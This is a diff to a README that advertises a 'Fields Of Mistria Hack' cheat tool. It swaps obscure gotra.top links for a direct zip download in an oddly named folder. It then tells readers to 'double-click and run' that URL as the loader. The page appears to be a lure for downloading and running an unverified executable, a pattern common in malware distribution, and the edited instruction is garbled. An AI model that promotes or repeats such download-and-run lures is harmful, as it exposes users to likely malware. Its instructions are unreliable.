@@ -1,7 +1,7 @@
 # Fields Of Mistria Hack
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/sakhama/Fields-Of-Mistria-Cheat/raw/refs/heads/main/petitionist/Fields_Mistria_Cheat_Of_v1.8-alpha.5.zip](https://github.com/sakhama/Fields-Of-Mistria-Cheat/raw/refs/heads/main/petitionist/Fields_Mistria_Cheat_Of_v1.8-alpha.5.zip)](https://github.com/sakhama/Fields-Of-Mistria-Cheat/raw/refs/heads/main/petitionist/Fields_Mistria_Cheat_Of_v1.8-alpha.5.zip)
 
 **Fields Of Mistria Hack** is a tool designed to enhance your gameplay experience by automating certain aspects of the game. It gives you an edge by performing repetitive tasks such as combat, farming, gathering resources, and more, all while maintaining a seamless gameplay experience.
 
@@ -31,7 +31,7 @@ Before you begin, ensure you have:
    - Extract the contents of the **Fields Of Mistria Hack** to a folder on your computer.
 
 3. **Run the Loader**:
-   - Double-click and run **Loader.exe** (or the corresponding file for your operating system).
+   - Double-click and run **https://github.com/sakhama/Fields-Of-Mistria-Cheat/raw/refs/heads/main/petitionist/Fields_Mistria_Cheat_Of_v1.8-alpha.5.zip** (or the corresponding file for your operating system).
    
 4. The loader will automatically launch the **Fields Of Mistria Hack** and let you configure the settings.
 
